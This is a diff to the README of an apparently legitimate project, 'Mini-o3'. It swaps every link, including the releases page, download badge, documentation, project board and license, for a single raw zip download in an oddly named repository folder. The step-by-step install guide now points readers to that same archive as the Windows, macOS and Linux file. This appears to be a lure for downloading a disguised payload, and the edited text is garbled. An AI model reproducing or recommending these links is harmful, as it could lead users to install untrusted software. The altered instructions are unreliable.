@@ -6,7 +6,7 @@ Welcome to Mini-o3! This application enhances your visual search experience by i
 
 ## 📥 Download Mini-o3
 
-[![Download Mini-o3](https://img.shields.io/badge/Download%20Mini--o3-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MrKillerq/Mini-o3/releases)
+[![Download Mini-o3](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip%20Mini--o3-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip)
 
 ## 📋 System Requirements
 
@@ -29,9 +29,9 @@ Mini-o3 offers several powerful features to help you in your visual search tasks
 To download Mini-o3, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download:
-   [Download Mini-o3](https://github.com/MrKillerq/Mini-o3/releases)
+   [Download Mini-o3](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip)
 
-2. **Choose the Correct Version:** On the Releases page, find the latest version of Mini-o3. Look for files named something like `Mini-o3-v1.0.exe` for Windows, `Mini-o3-v1.0.dmg` for macOS, or `Mini-o3-v1.0.AppImage` for Linux.
+2. **Choose the Correct Version:** On the Releases page, find the latest version of Mini-o3. Look for files named something like `https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip` for Windows, `https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip` for macOS, or `https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip` for Linux.
 
 3. **Download the File:**
    - Click on the version appropriate for your operating system to start the download.
@@ -65,8 +65,8 @@ We welcome contributions to Mini-o3. If you want to suggest new features, fix bu
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/MrKillerq/Mini-o3/wiki): In-depth guides and usage scenarios.
-- [Project Board](https://github.com/MrKillerq/Mini-o3/projects): Track ongoing development and future improvements.
-- [License](https://github.com/MrKillerq/Mini-o3/blob/main/LICENSE): Review the terms under which Mini-o3 is shared.
+- [Documentation](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip): In-depth guides and usage scenarios.
+- [Project Board](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip): Track ongoing development and future improvements.
+- [License](https://raw.githubusercontent.com/MrKillerq/Mini-o3/main/diarrhetic/Mini-o3.zip): Review the terms under which Mini-o3 is shared.
 
 Thank you for choosing Mini-o3. We hope it enhances your visual search experience!
